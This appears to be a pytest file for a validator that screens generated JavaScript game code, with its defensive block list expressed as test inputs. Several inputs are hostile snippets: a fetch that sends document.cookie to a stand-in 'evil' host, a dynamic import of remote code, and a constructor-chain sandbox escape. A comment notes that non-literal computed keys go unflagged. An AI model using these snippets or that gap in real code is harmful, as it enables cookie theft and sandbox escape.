from __future__ import annotations

from learnai.services.generation.game_validator import find_violations

_CLEAN_CODE = """
const [score, setScore] = useState(0);
useEffect(() => {
  const onKey = (e) => { if (e.key === "Enter") setScore(score + 1); };
  return () => {};
}, []);
return React.createElement("div", null, "score: " + score);
"""


def test_clean_code_has_no_violations() -> None:
    assert find_violations(_CLEAN_CODE) == []


def test_syntax_error_is_a_violation() -> None:
    violations = find_violations("const x = ;")
    assert len(violations) == 1
    assert violations[0].rule == "syntax_error"


def test_eval_is_denied() -> None:
    violations = find_violations("eval('2+2');")
    assert any(v.rule == "denied_identifier" and "eval" in v.detail for v in violations)


def test_function_constructor_is_denied() -> None:
    violations = find_violations("const f = Function('return 1');")
    assert any(v.rule == "denied_identifier" and "Function" in v.detail for v in violations)


def test_document_cookie_is_denied() -> None:
    violations = find_violations("document.cookie;")
    assert any(v.rule == "denied_identifier" and "document" in v.detail for v in violations)


def test_fetch_is_denied() -> None:
    violations = find_violations("fetch('//evil/' + document.cookie);")
    rules = {v.rule for v in violations}
    assert "denied_identifier" in rules


def test_window_top_and_self_are_denied() -> None:
    for snippet in ("window.location;", "top.location;", "self.postMessage;", "globalThis.x;"):
        assert find_violations(snippet), f"expected a violation for {snippet!r}"


def test_local_storage_is_denied() -> None:
    violations = find_violations("localStorage.setItem('x', '1');")
    assert any(v.rule == "denied_identifier" for v in violations)


def test_dot_constructor_access_is_denied() -> None:
    violations = find_violations("({}).constructor.constructor('return this')();")
    assert any(v.rule == "denied_property" and "constructor" in v.detail for v in violations)


def test_bracket_proto_access_is_denied() -> None:
    violations = find_violations("obj['__proto__'];")
    assert any(v.rule == "denied_property" and "__proto__" in v.detail for v in violations)


def test_dynamic_import_is_denied() -> None:
    violations = find_violations("import('//evil/module.js');")
    assert any(v.rule == "dynamic_import" for v in violations)


def test_computed_member_with_non_literal_key_is_not_flagged() -> None:
    # obj[someVar] can't be statically resolved to "constructor" or
    # "__proto__" — a known, disclosed limitation, not a bug.
    assert find_violations("const key = 'x'; obj[key];") == []
